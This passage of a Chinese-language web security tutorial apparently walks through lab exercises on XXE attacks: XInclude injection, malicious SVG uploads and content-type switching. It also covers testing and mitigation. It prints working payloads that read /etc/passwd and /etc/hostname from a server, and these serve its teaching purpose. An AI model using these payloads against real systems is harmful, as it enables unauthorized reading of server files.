1. 在这种情况下，不能执行典型的XXE攻击，因为不能控制整个XML文档，因此不能定义或修改文件DOCTYPE元素。但也许可以使用XInclude替代。XInclude是XML规范的一部分，它允许从子文档构建XML文档。可以放置一个XInclude XML文档中的任何数据值内的攻击，因此在仅控制放置在服务器端XML文档中的单个数据项的情况下可以执行攻击  
  
1. 若要执行XInclude  
攻击，你需要引用XInclude  
命名空间并提供希望包含的文件的路径。例如：  
  
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>

```  
### 实验7：利用XInclude检索文件  
  
**实验目标：**  
- 此实验室具有一个 “Check stock（库存检查）” 功能，它会将用户输入的数据嵌入到服务端 XML 文档中，随后对该文档进行解析。  
  
- 由于你无法控制整个 XML 文档，因此无法定义 DTD 来发起经典的 XXE 攻击。  
  
- 若要解决实验室问题，请注入XInclude  
语句并检索/etc/passwd  
文件的内容。  
  
- 提示 默认情况下，XInclude  
会把引入的目标文档解析为 XML。但由于/etc/passwd  
不是有效的 XML 格式，因此你需要向XInclude  
指令添加一个额外的属性来更改此行为。  
  
如果把/etc/passwd  
当作 XML 来处理的话会出现 “解析错误” ，所以要添加一个额外的属性，将其当作 “普通文本” 来处理。  
  
productId  
参数可以触发错误消息，具有回显。![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jv7IhtdDp3p56tsRxYaxUjlxLUG2bQ3qzI75mrDCCib2SicOBNVDBoSTXrUZU7UsgcVl7u8pdgOXsSA/640?wx_fmt=png&from=appmsg "")  
构造 XInclude 攻击载荷，添加到 productId 参数当中。  
- xmlns  
用于加载 XInclude 功能模块，并将其命名为xi  
。  
  
- 然后使用该模块，加载/etc/passwd  
的文件内容。  
  
- 注意，由于目标文件是 “非XML格式”，加载时会出现错误，所以要添加一个属性parse="text"  
，将其当作普通文本来处理。  
  
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</foo>

```  
  
XInclude 攻击成功触发，程序返回了对应的文件内容。![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jv7IhtdDp3p56tsRxYaxUjl2ibrRj7HnR77P6vlEljo5CuAD1E9rWianDBibBK02SCGebQBWpwmgyibcw/640?wx_fmt=png&from=appmsg "")  
  
## 7.2 通过文件上传进行XXE攻击  
1. 一些应用程序允许用户上传文件，然后在服务器端进行处理。一些常见的文件格式使用XML或包含XML子组件。基于XML的格式的例子有DOCX这样的办公文档格式和SVG这样的图像格式。  
  
1. 如应用程序可能允许用户上载图像，并在上载后在服务器上处理或验证这些图像。即使应用程序希望接收PNG或JPEG之类的格式，所使用的图像处理库也可能支持SVG图像。由于SVG格式使用XML，攻击者可以提交恶意SVG图像，从而到达XXE漏洞的隐藏攻击面。  
  
### 实验8：通过图像文件上传利用XXE  
  
**实验目标：**  
- 该实验室允许用户将头像附加到评论中，并使用 Apache Batik 库来处理图像文件。  
  
- 要解决实验室问题，请上传一张图像，该图像在处理后显示/etc/hostname  
文件的内容。然后使用 “Submit solution” 按钮提交服务器主机名的值。  
  
- 提示：SVG 图像格式使用 XML。  
  
SVG教程 (opens new window)  
可用于生成图形，如图所示，五颜六色、还能控制字体。  
  
我们可以读取文件内容，然后将其显示在图像当中。为文字添加颜色，应该就能看到回显了。  
  
创建包含以下内容的本地SVG图像：  
```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>

```  
  
在博客文章上发表评论，并将此图像作为头像上传![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jv7IhtdDp3p56tsRxYaxUjlR6RXyrPNfZFd66rtq8WfwDpnV5Fo5IkvtrV2PowcScgvcIWuC2omZQ/640?wx_fmt=png&from=appmsg "")  
打开图片即可![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jv7IhtdDp3p56tsRxYaxUjlypFKpXV0ZoYIXWUY7I8vEREzueFeJWbzqbbCQI0l3Yjq1AjgNzKD5A/640?wx_fmt=png&from=appmsg "")  
  
## 7.3 通过修改内容类型的XXE攻击  
  
1、大多数POST请求使用由HTML表单生成的默认内容类型，例如application/x-www-form-urlencoded。有些网站希望接收这种格式的请求，但也会容忍其他内容类型，包括XML。  
  
例如，如果正常请求包含以下内容：  
```
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7
 
foo=bar

```  
  
然后，可以提交以下请求，得到相同的结果：  
```
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52
 
<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>

```  
  
如果应用程序允许在消息正文中包含XML的请求，并将正文内容解析为XML，那么只需将请求重新格式化为使用XML格式，就可以到达隐藏的XXE攻击面。  
# 8.查找和测试XXE漏洞  
1. 简述： 绝大多数XXE漏洞都可以使用Burp Suite的Web漏洞扫描程序  
  
XXE漏洞的手动测试通常包括：  
- 测试  
文件检索 (opens new window)  
，基于已知的操作系统文件 来定义外部实体，并在可回显的数据中使用该实体。  
  
- 测试  
盲 XXE 漏洞 (opens new window)  
，基于你所控制的 URL 来定义外部实体，并监视与该 URL 的交互。  
Burp Collaborator (opens new window)  
非常适合此目的。  
  
- 通过  
XInclude 攻击 (opens new window)  
尝试检索已知的操作系统文件，测试服务器端 XML 文档中是否包含用户提供的非 XML 数据，以及提供该数据时的易受攻击性。  
  
1. XML只是一种数据传输格式。确保您还测试了任何基于XML的功能的其他漏洞，如XSS和SQL注入。您可能需要使用XML转义序列对有效负载进行编码，以避免破坏语法，但您也可以使用此序列来混淆攻击，以绕过薄弱的防御。  
  
# 9.如何防范XXE漏洞  
  
实际上，几乎所有 XXE 漏洞的出现都是因为，应用程序的 XML 解析库支持某些潜在的危险 XML 功能，而应用程序通常不需要这些功能。防止 XXE 攻击最简单、最有效的方法是禁用这些功能。  
  
通常，“禁用外部实体的解析” 并 “禁用对XInclude的支持” 就足够了。这可以通过 配置选项或编程方式 覆盖默认行为来完成。有关如何 禁用不必要功能 的详细信息，请参阅 XML 解析库或 API 的文档。  
  
使用 Burp Suite 的 Web 漏洞扫描程序查找 XXE 漏洞  
  
  
